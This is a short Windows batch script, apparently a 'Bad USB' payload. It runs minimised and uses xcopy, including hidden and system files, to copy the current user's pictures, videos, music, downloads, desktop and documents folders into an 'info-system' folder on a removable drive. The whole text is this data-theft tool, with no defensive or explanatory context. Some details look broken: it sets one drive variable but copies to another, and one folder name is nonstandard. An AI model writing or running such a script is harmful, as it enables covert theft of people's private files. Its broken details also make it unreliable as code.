:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y /g
echo Bad-usb
%backupcmd% "%USERPROFILE%\pictures" "%drive%\info-system\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\info-system\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\info-system\vids"
%backupcmd% "%USERPROFILE%\Download" "%drive%\info-system\Download"
%backupcmd% "%USERPROFILE%\Desktop" "%drive%\info-system\Desktop"
%backupcmd% "%USERPROFILE%\Music" "%drive%\info-system\Music"
%backupcmd% "%USERPROFILE%\Documents" "%drive%\info-system\Documents"
@echo done...